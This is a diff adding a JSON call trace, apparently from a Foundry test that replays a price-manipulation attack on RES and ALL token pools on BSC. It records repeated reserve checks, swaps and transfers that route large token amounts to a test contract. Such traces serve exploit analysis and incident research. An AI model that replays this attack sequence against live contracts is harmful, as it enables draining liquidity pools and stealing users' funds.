+        "args": "RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], 477404141417463290209 [4.774e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "439",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "4475079325253002664477 [4.475e21]"
+    },
+    {
+        "id": "541",
+        "args": "USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb]",
+        "original_code": null,
+        "description": null,
+        "return_value": "2725054551339786247 [2.725e18]"
+    },
+    {
+        "id": "531",
+        "args": "USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb]",
+        "original_code": null,
+        "description": null,
+        "return_value": "7376257545223082793454545 [7.376e24]"
+    },
+    {
+        "id": "541",
+        "args": "RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "28566581459326564742365 [2.856e22]"
+    },
+    {
+        "id": "9006",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "531",
+        "args": "USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1936244369601288459444022 [1.936e24]"
+    },
+    {
+        "id": "563",
+        "args": "USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]",
+        "original_code": null,
+        "description": null,
+        "return_value": "3117421787609 [3.117e12]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "1936244369601288459444022 [1.936e24], 3117421787609 [3.117e12], 1665051347 [1.665e9]"
+    },
+    {
+        "id": "563",
+        "args": "0x272dC5Ab4Aba4c80DcD5dc46299dB44614d32Edd",
+        "original_code": null,
+        "description": null,
+        "return_value": "91371986188486 [9.137e13]"
+    },
+    {
+        "id": "97596",
+        "args": "0x272dC5Ab4Aba4c80DcD5dc46299dB44614d32Edd, USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A], 91371986188486 [9.137e13]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "439",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "5607099684513225068 [5.607e18]"
+    },
+    {
+        "id": "465",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]"
+    },
+    {
+        "id": "397",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "1936244369601288459444022 [1.936e24], 3117421787609 [3.117e12], 1665051347 [1.665e9]"
+    },
+    {
+        "id": "531",
+        "args": "USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1936244369601288459444022 [1.936e24]"
+    },
+    {
+        "id": "252",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73"
+    },
+    {
+        "id": "676",
+        "args": "RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]",
+        "original_code": null,
+        "description": null,
+        "return_value": "USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "1936244369601288459444022 [1.936e24], 3117421787609 [3.117e12], 1665051347 [1.665e9]"
+    },
+    {
+        "id": "465",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]"
+    },
+    {
+        "id": "1021",
+        "args": "913719861884 [9.137e11], 3117421787609 [3.117e12], 1936244369601288459444022 [1.936e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "438030394819434703889331 [4.38e23]"
+    },
+    {
+        "id": "252",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73"
+    },
+    {
+        "id": "676",
+        "args": "USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955], ALL_TOKEN: [0x04C0f31C0f59496cf195d2d7F1dA908152722DE7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "2725054551339786247 [2.725e18], 7376257545223082793454545 [7.376e24], 1665051347 [1.665e9]"
+    },
+    {
+        "id": "465",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "ALL_TOKEN: [0x04C0f31C0f59496cf195d2d7F1dA908152722DE7]"
+    },
+    {
+        "id": "1021",
+        "args": "438030394819434703889331 [4.38e23], 7376257545223082793454545 [7.376e24], 2725054551339786247 [2.725e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "152392574961636241 [1.523e17]"
+    },
+    {
+        "id": "6418",
+        "args": "0x272dC5Ab4Aba4c80DcD5dc46299dB44614d32Edd, 152392574961636241 [1.523e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "439",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "4475079325253002664477 [4.475e21]"
+    },
+    {
+        "id": "252",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73"
+    },
+    {
+        "id": "676",
+        "args": "RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]",
+        "original_code": null,
+        "description": null,
+        "return_value": "USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "1936244369601288459444022 [1.936e24], 3117421787609 [3.117e12], 1665051347 [1.665e9]"
+    },
+    {
+        "id": "465",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]"
+    },
+    {
+        "id": "1021",
+        "args": "4568599309424 [4.568e12], 3117421787609 [3.117e12], 1936244369601288459444022 [1.936e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1149742050326415372250094 [1.149e24]"
+    },
+    {
+        "id": "252",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73"
+    },
+    {
+        "id": "676",
+        "args": "USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955], ALL_TOKEN: [0x04C0f31C0f59496cf195d2d7F1dA908152722DE7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "2725054551339786247 [2.725e18], 7376257545223082793454545 [7.376e24], 1665051347 [1.665e9]"
+    },
+    {
+        "id": "465",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "ALL_TOKEN: [0x04C0f31C0f59496cf195d2d7F1dA908152722DE7]"
+    },
+    {
+        "id": "1021",
+        "args": "1149742050326415372250094 [1.149e24], 7376257545223082793454545 [7.376e24], 2725054551339786247 [2.725e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "366682049651027691 [3.666e17]"
+    },
+    {
+        "id": "252",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73"
+    },
+    {
+        "id": "676",
+        "args": "RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]",
+        "original_code": null,
+        "description": null,
+        "return_value": "USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "1936244369601288459444022 [1.936e24], 3117421787609 [3.117e12], 1665051347 [1.665e9]"
+    },
+    {
+        "id": "465",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]"
+    },
+    {
+        "id": "1021",
+        "args": "4568599309424 [4.568e12], 3117421787609 [3.117e12], 1936244369601288459444022 [1.936e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1149742050326415372250094 [1.149e24]"
+    },
+    {
+        "id": "252",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73"
+    },
+    {
+        "id": "676",
+        "args": "USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955], ALL_TOKEN: [0x04C0f31C0f59496cf195d2d7F1dA908152722DE7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "2725054551339786247 [2.725e18], 7376257545223082793454545 [7.376e24], 1665051347 [1.665e9]"
+    },
+    {
+        "id": "465",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "ALL_TOKEN: [0x04C0f31C0f59496cf195d2d7F1dA908152722DE7]"
+    },
+    {
+        "id": "1021",
+        "args": "1149742050326415372250094 [1.149e24], 7376257545223082793454545 [7.376e24], 2725054551339786247 [2.725e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "366682049651027691 [3.666e17]"
+    },
+    {
+        "id": "6418",
+        "args": "0xe3f0C9F99BECced5197300d64ea3a814ECD862f7, 366682049651027691 [3.666e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "439",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "4475079325253002664477 [4.475e21]"
+    },
+    {
+        "id": "563",
+        "args": "USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]",
+        "original_code": null,
+        "description": null,
+        "return_value": "80783610047822 [8.078e13]"
+    },
+    {
+        "id": "18393",
+        "args": "1861345101891976682713426 [1.861e24], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "3271",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1861345101891976682713426 [1.861e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "531",
+        "args": "USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]",
+        "original_code": null,
+        "description": null,
+        "return_value": "74899267709311776730596 [7.489e22]"
+    },
+    {
+        "id": "563",
+        "args": "USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]",
+        "original_code": null,
+        "description": null,
+        "return_value": "80783610047822 [8.078e13]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "2725054551339786247 [2.725e18], 7376257545223082793454545 [7.376e24], 1665051347 [1.665e9]"
+    },
+    {
+        "id": "541",
+        "args": "0x272dC5Ab4Aba4c80DcD5dc46299dB44614d32Edd",
+        "original_code": null,
+        "description": null,
+        "return_value": "797890163898149498634 [7.978e20]"
+    },
+    {
+        "id": "35346",
+        "args": "0x272dC5Ab4Aba4c80DcD5dc46299dB44614d32Edd, USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb], 797890163898149498634 [7.978e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "439",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "4475079325253002664477 [4.475e21]"
+    },
+    {
+        "id": "465",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "ALL_TOKEN: [0x04C0f31C0f59496cf195d2d7F1dA908152722DE7]"
+    },
+    {
+        "id": "397",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "2725054551339786247 [2.725e18], 7376257545223082793454545 [7.376e24], 1665051347 [1.665e9]"
+    },
+    {
+        "id": "531",
+        "args": "USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb]",
+        "original_code": null,
+        "description": null,
+        "return_value": "7376257545223082793454545 [7.376e24]"
+    },
+    {
+        "id": "541",
+        "args": "USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb]",
+        "original_code": null,
+        "description": null,
+        "return_value": "641037185669859385154 [6.41e20]"
+    },
+    {
+        "id": "18371",
+        "args": "0, 7344822758505272549703787 [7.344e24], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "3271",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 7344822758505272549703787 [7.344e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "541",
+        "args": "USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb]",
+        "original_code": null,
+        "description": null,
+        "return_value": "641037185669859385154 [6.41e20]"
+    },
+    {
+        "id": "531",
+        "args": "USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb]",
+        "original_code": null,
+        "description": null,
+        "return_value": "31434786717810243750758 [3.143e22]"
+    },
+    {
+        "id": "531",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "9206167860397249232417216 [9.206e24]"
+    },
+    {
+        "id": "3271",
+        "args": "0xD7B7218D778338Ea05f5Ecce82f86D365E25dBCE, 631929929597153264346714 [6.319e23]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2531",
+        "args": "0xD7B7218D778338Ea05f5Ecce82f86D365E25dBCE",
+        "original_code": null,
+        "description": null,
+        "return_value": "98915494016215226273 [9.891e19]"
+    },
+    {
+        "id": "531",
+        "args": "0xD7B7218D778338Ea05f5Ecce82f86D365E25dBCE",
+        "original_code": null,
+        "description": null,
+        "return_value": "631929929597153264346714 [6.319e23]"
+    },
+    {
+        "id": "531",
+        "args": "0xD7B7218D778338Ea05f5Ecce82f86D365E25dBCE",
+        "original_code": null,
+        "description": null,
+        "return_value": "98915494016215226273 [9.891e19]"
+    },
+    {
+        "id": "531",
+        "args": "0xD7B7218D778338Ea05f5Ecce82f86D365E25dBCE",
+        "original_code": null,
+        "description": null,
+        "return_value": "631929929597153264346714 [6.319e23]"
+    },
+    {
+        "id": "531",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "8574237930800095968070502 [8.574e24]"
+    },
+    {
+        "id": "3271",
+        "args": "0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A, 449309959621826321233196 [4.493e23]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2531",
+        "args": "0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A",
+        "original_code": null,
+        "description": null,
+        "return_value": "86864019112310660086 [8.686e19]"
+    },
+    {
+        "id": "531",
+        "args": "0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A",
+        "original_code": null,
+        "description": null,
+        "return_value": "449309959621826321233196 [4.493e23]"
+    },
+    {
+        "id": "531",
+        "args": "0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A",
+        "original_code": null,
+        "description": null,
+        "return_value": "86864019112310660086 [8.686e19]"
+    },
+    {
+        "id": "531",
+        "args": "0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A",
+        "original_code": null,
+        "description": null,
+        "return_value": "449309959621826321233196 [4.493e23]"
+    },
+    {
+        "id": "531",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "8124927971178269646837306 [8.124e24]"
+    },
+    {
+        "id": "531",
+        "args": "USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]",
+        "original_code": null,
+        "description": null,
+        "return_value": "74899267709311776730596 [7.489e22]"
+    },
+    {
+        "id": "531",
+        "args": "USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb]",
+        "original_code": null,
+        "description": null,
+        "return_value": "31434786717810243750758 [3.143e22]"
+    }
+]
